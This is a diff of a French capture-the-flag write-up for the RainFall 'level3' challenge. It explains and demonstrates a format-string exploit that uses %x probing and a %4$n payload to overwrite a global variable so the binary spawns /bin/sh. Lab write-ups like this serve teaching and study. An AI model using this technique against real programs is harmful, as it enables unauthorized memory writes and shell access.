@@ -62,18 +62,17 @@ Dump of assembler code for function v:
    0x080484e4 <+64>:	mov    eax,ds:0x8049880                # stdout
    0x080484e9 <+69>:	mov    edx,eax
    0x080484eb <+71>:	mov    eax,0x8048600                   # "Wait what?!\n"
-   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx         # 3eme arg de fwrite (stdout)
-   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc         # ???
-   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1         # ???
+   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx         # 4eme arg de fwrite (stdout)
+   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc         # 3eme arg de fwrite (13)
+   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1         # 2eme arg de fwrite (1)
    0x08048504 <+96>:	mov    DWORD PTR [esp],eax             # 1er arg de fwrite ("Wait what?!\n")
-   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>          # size_t fwrite(const void ptr[restrict .size * .n], size_t size, size_t n, FILE *restrict stream);
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>          # size_t fwrite("Wait what?!\n", 1, 0xc, stdout);
    0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d    # arg de system ("/bin/sh")
-   0x08048513 <+111>:	call   0x80483c0 <system@plt>       # system(""/bin/sh")
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>       # system("/bin/sh")
    0x08048518 <+116>:	leave  
    0x08048519 <+117>:	ret    
 End of assembler dump.
 ```
-
 
 On comprend d'après le code assembleur que le programme alloue sur la stack une variable locale de 520 octets qui sert de buffer pour `fgets()`. La fonction `fgets()` est présentée de cette manière par le man "fgets() lit au plus size - 1 caractères depuis stream et les place dans le tampon pointé par s. La lecture s'arrête après EOF ou un retour chariot. Si un retour chariot (newline) est lu, il est placé dans le tampon. Un octet nul (« \0 ») final est placé à la fin de la ligne." 
 
@@ -89,8 +88,20 @@ Cette valeur ne se situe pas sur la pile, il s'agit d'une valeur globale initial
 (gdb) x/d 0x804988c
 0x804988c <m>:	0
 ```
-A `v+62`, si cette valeur n'est pas égale l'instruction `jump` décale l'exécution `v+116`, et on quitte la fonction avec `leave` et `ret`.
-Si la valeur à `0x804988c` est égale à `0x40`, alors on rentre dans le bloc d'instruction qui va executer un `fwrite()` puis un appel système avec "/bin/sh" comme argument.
+
+La valeur de la variable `m` se trouve en effet dans la section `.data` comme le relève l'inspection de l'elf avec `objdump`.
+
+``` bash
+level3@RainFall:~$ objdump -D level3
+[...]
+Disassembly of section .data:
+[...]
+0804988c <m>:
+ 804988c:	00 00                	add    %al,(%eax)
+```
+
+A `v+62`, si cette valeur n'est pas égale, l'instruction `jump` décale l'exécution `v+116`, et on quitte la fonction avec `leave` et `ret`.
+Si la valeur à `0x804988c` est égale à `0x40` (64 en décimal), alors on rentre dans le bloc d'instruction qui va executer un `fwrite()` puis un appel système avec "/bin/sh" comme argument.
 
 On peut le déduire en inspectant les données aux adresses `0x8048600` (`v+71`) et `0x804860d` (`v+104`) qui sont mises dans les valeurs pointées par `esp` pour être passées en argument de `fwrite()` puis de `system()`
 
@@ -105,13 +116,13 @@ Pour ce faire on va utiliser le format de string `%x` pour calculer à quelle pl
 `%x` affiche une valeur en hexa se situant sur la pile, dans un ordre ascendant, chaque utilisation successive de `%x` va lire des données successives sur 4 octets. 
 
 ``` bash
-level3@RainFall:~$ echo $(python2 -c 'print("AAAA" + "%x-" *7)') | ./level3
+level3@RainFall:~$ echo $(python2 -c 'print("AAAA" + "%x-" * 7)') | ./level3
 AAAA200-b7fd1ac0-b7ff37d0-41414141-252d7825-78252d78-2d78252d-
 ```
 
-Avec cet exploit, on comprend que l'argument donné à notre printf, commence à la 4eme position, cette deniere affichant la valeur en hexa des 4 "A".
+Avec cet exploit, on comprend que l'argument donné à notre printf, commence à la 4eme position, cette derniere affichant la valeur en hexa des 4 "A".
 
-Notre but va être de donner a printf l'adresse de `0x804988c` et d'aller modifier la valeur surlaquelle elle pointe avec le format de string `%n`. Le spécificateur `%n`n'affiche pas une valeur mais écrit en mémoire à l'adresse pointée par l'argument correspondant le nombre d'octets déjà affichés par `printf` jusqu'à ce point. C'est ce qui permet décrire de manière arbitraire en mémoire.
+Notre but va être de donner a printf l'adresse de `0x804988c` et d'aller modifier la valeur sur laquelle elle pointe avec le format de string `%n`. Le spécificateur `%n`n'affiche pas une valeur mais écrit en mémoire à l'adresse pointée par l'argument correspondant le nombre d'octets déjà affichés par `printf` jusqu'à ce point. C'est ce qui permet décrire de manière arbitraire en mémoire.
 
 Avant modification la valeur pointée par `0x804988c` correspond à 0 :
 
@@ -136,7 +147,6 @@ On peut le décomposer de cette manière:
 - `"\x8c\x98\x04\x08"` : ecriture en little endian de l'adresse (4 octets)
 - `"A"*60` : ecriture de 60 octets
 - `"%4$n"` : on cible le 4ème mots lut par printf et on modifie la valeur sur laquelle il pointe par le nombre d'octets écrits jusque là.
-
 
 Une deuxième manière d'écrire notre exploit consiste à utiliser `"%60d%4$n"` :
 
